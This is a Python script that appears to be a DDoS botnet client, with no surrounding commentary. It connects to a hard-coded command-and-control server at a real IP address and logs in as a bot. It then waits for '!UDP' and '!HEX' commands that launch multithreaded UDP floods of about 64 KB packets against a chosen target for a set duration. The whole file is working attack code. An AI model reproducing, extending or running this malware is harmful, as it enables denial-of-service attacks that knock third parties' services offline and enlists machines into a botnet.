import socket
import time
import threading

C2_ADDRESS = "147.185.221.24"
C2_PORT = 21142

def udp_attack(ip, port, duration):
    payload = b'\x00' * 65500
    end_time = time.time() + duration
    while time.time() < end_time:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 524288)
        s.sendto(payload, (ip, port))
        s.close()

def hex_attack(ip, port, duration):
    payload = b'\xff\xaa\x55\x00\xcc\x33\x99\x11' * 8188
    end_time = time.time() + duration
    while time.time() < end_time:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 524288)
        s.sendto(payload, (ip, port))
        s.close()

def handle_c2(c2_socket):
    c2_socket.send(b'669787761736865726500')
    while True:
        time.sleep(1)
        data = c2_socket.recv(1024)
        if b'Username' in data:
            c2_socket.send(b'BOT')
            break
    while True:
        time.sleep(1)
        data = c2_socket.recv(1024)
        if b'Password' in data:
            c2_socket.send(b'\xff\xff\xff\xff\75')
            break
    while True:
        data = c2_socket.recv(1024).strip()
        if not data:
            break
        args = data.split(b' ')
        command = args[0].upper()
        if command == b'!UDP' and len(args) >= 4:
            ip = args[1].decode()
            port = int(args[2])
            duration = int(args[3])
            for _ in range(5):
                threading.Thread(target=udp_attack, args=(ip, port, duration)).start()
        elif command == b'!HEX' and len(args) >= 4:
            ip = args[1].decode()
            port = int(args[2])
            duration = int(args[3])
            for _ in range(5):
                threading.Thread(target=hex_attack, args=(ip, port, duration)).start()
        elif command == b'!PING':
            c2_socket.send(b'PONG')
    c2_socket.close()

def reconnect_thread():
    while True:
        try:
            c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            c2.connect((C2_ADDRESS, C2_PORT))
            handle_c2(c2)
            break
        except Exception:
            if 'c2' in locals():
                c2.close()
            time.sleep(1)

def main():
    while True:
        threading.Thread(target=reconnect_thread).start()
        time.sleep(5)

if __name__ == "__main__":
    main()